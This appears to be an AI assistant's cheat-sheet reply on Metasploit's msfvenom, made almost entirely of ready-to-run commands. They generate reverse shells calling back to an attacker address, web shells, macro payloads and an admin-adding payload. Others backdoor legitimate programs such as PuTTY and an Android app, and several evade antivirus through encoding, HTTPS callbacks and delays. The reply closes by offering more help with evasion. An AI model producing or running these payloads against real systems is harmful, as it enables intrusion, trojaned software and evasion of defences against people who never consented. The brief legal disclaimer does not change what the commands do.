`msfvenom` is **Metasploit's payload generator** - a tool for creating standalone malicious executables/shellcode. It's essential for penetration testing, exploit development, and red team operations.

## **What msfvenom replaced:**
- `msfpayload` (payload generation)
- `msfencode` (encoding/obfuscation)

## **Basic Syntax**
```bash
msfvenom -p <payload> [options] -f <format> -o <output>
```

## **1. Listing Options**
```bash
# List all payloads
msfvenom -l payloads

# List payloads by platform
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep android

# List encoders
msfvenom -l encoders

# List formats (output types)
msfvenom -l formats

# List all (payloads, encoders, nops, formats, platforms, arches)
msfvenom --list all
```

## **2. Basic Payload Generation**

### **Windows Payloads**
```bash
# Simple reverse shell (EXE)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Reverse shell (DLL)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f dll -o shell.dll

# Bind shell
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind.exe

# Add user payload
msfvenom -p windows/adduser USER=hacker PASS=Hack123! -f exe -o adduser.exe

# HTTPS reverse shell (more stealth)
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 -f exe -o https_shell.exe
```

### **Linux Payloads**
```bash
# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf

# Linux bind shell
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf -o bind.elf
```

### **Android Payloads**
```bash
# Android reverse shell
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o shell.apk

# Android with icon (more believable)
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o app.apk --platform android -a dalvik -x legitimate_app.apk
```

### **Mac Payloads**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho -o shell.macho
```

## **3. Encoding & Obfuscation**
```bash
# Simple encoding (shikata_ga_nai)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -o encoded.exe

# Multiple encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o multi_encoded.exe

# Specify encoder with options
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -o badchar.exe

# XOR encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -e x86/xor_dynamic -o xor_encoded.exe
```

## **4. Output Formats**

### **Executable Formats**
```bash
# Windows
-f exe
-f dll
-f vbs
-f psh (PowerShell)
-f hta-psh (HTA with PowerShell)

# Linux
-f elf
-f elf-so (shared object)

# Web
-f asp
-f aspx
-f jsp
-f war (Java web archive)
-f php
```

### **Shellcode Formats (for exploits)**
```bash
# C format
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c

# Python format
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f python

# Ruby format
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f ruby

# Raw (for file injection)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shellcode.bin

# Other formats:
-f java
-f perl
-f bash
-f hex
-f powershell
-f csharp
```

## **5. Advanced Options**

### **Architecture Specification**
```bash
# Specify architecture
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -a x86 -f exe -o shell_x86.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -a x64 -f exe -o shell_x64.exe
```

### **Platform Specification**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 --platform windows -f exe -o shell.exe
```

### **Prepend/Append**
```bash
# Add nopsled
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -n 50 -o nopsled.exe

# Prepend/append files
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -x /path/to/legitimate.exe -o trojaned.exe
```

### **Template Injection**
```bash
# Inject payload into existing executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x /usr/share/windows-binaries/putty.exe -f exe -o putty_backdoored.exe

# Keep original functionality
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x /usr/share/windows-binaries/putty.exe -k -f exe -o putty_backdoored.exe
```

## **6. Practical Examples**

### **Web Shells**
```bash
# PHP reverse shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php

# ASP shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f asp -o shell.asp

# JSP shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.jsp
```

### **Office Documents**
```bash
# Excel macro
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f vba-exe -o macro.vba

# PowerShell one-liner
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh -o shell.ps1
```

### **Linux Reverse Shell One-Liner**
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf | base64
```

## **7. Working with Handlers**

### **Create payload and handler script**
```bash
# 1. Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# 2. Create handler.rc
cat > handler.rc << EOF
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false
exploit -j
EOF

# 3. Run handler
msfconsole -r handler.rc
```

## **8. Customizing Payloads**

### **Changing default options**
```bash
# View payload options
msfvenom -p windows/meterpreter/reverse_tcp --list-options

# Set custom options
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o migrated.exe
```

### **Staged vs Stageless**
```bash
# Staged (smaller, downloads rest later)
windows/meterpreter/reverse_tcp        # Staged
windows/meterpreter_reverse_tcp        # Stageless

linux/x64/meterpreter/reverse_tcp      # Staged  
linux/x64/meterpreter_reverse_tcp      # Stageless
```

## **9. Stealth & Evasion Techniques**

```bash
# Use HTTPS
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 -f exe -o https_shell.exe

# Custom user-agent
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 HttpUserAgent="Mozilla/5.0" -f exe -o custom_ua.exe

# Sleep before callback
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 InitialAutoRunScript="sleep 30" -f exe -o delayed.exe
```

## **10. Useful One-Liners**

```bash
# Quick reverse shell for testing
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell in C format (for buffer overflows)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b '\x00\x0a\x0d' -f c

# PowerShell encoded command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh-cmd

# Generate shellcode without bad characters
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b '\x00\x0a\x0d\x20' -f python
```

## **Important Notes & Warnings**

⚠️ **LEGAL DISCLAIMER:**
- Only use on systems you own or have explicit permission to test
- Payloads are detected by most antivirus software (unless heavily obfuscated)
- Always use in controlled lab environments

🔧 **Technical Notes:**
- Test payloads in VMs first
- Consider using **crypters** or **custom encoders** for AV evasion
- Staged payloads are smaller but require stable network connection
- Stageless payloads are larger but more reliable
- Always match payload architecture with target system

📚 **Best Practices:**
1. Use encoders sparingly (AV detects common encoders)
2. Test payloads before deployment
3. Consider custom compilation for better evasion
4. Use HTTPS/TLS payloads for encrypted C2
5. Implement proper error handling in handlers

Would you like help with:
1. Creating a specific type of payload?
2. Setting up a listener/handler?
3. Understanding payload evasion techniques?
4. Integrating msfvenom with other tools?
